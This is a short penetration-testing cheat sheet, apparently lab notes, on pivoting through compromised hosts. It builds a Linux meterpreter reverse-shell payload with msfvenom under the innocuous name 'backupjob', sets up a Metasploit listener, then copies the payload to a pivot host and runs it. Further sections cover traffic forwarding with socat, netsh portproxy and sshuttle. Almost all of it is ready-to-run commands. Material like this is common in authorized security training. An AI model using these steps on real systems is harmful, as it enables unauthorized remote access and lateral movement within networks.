# Pivoting/tunneling via Linux box using Metasploit 

Create a reverse shell payload for linux

```
msfconsole
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.96 -f elf -o backupjob LPORT=8080
```
Start the listener on the attack host:
```
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run
```

Copy the backupjob to the linux box
```
scp backupjob ubuntu@10.129.97.51:/home/ubuntu/backupjob 
```
Then in the pivot host run 
```
./backupjob
```
Now you have a reverse shell on your attack box.


# Tunneling via socat (Linux)

```
#Listen op port 8080 and forward all trafic to 10.10.14.18
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

# Tunneling via netsh (Windows)

```
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25


#Verify
netsh.exe interface portproxy show v4tov4
```

# Tunneling via sshuttle

This creates an entry in the Ip tables of the attack host routing all trafic in the 172.16.5.0/23 range to the pivot host via an SSH SOCKS proxy. No need for proxychains here
```
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```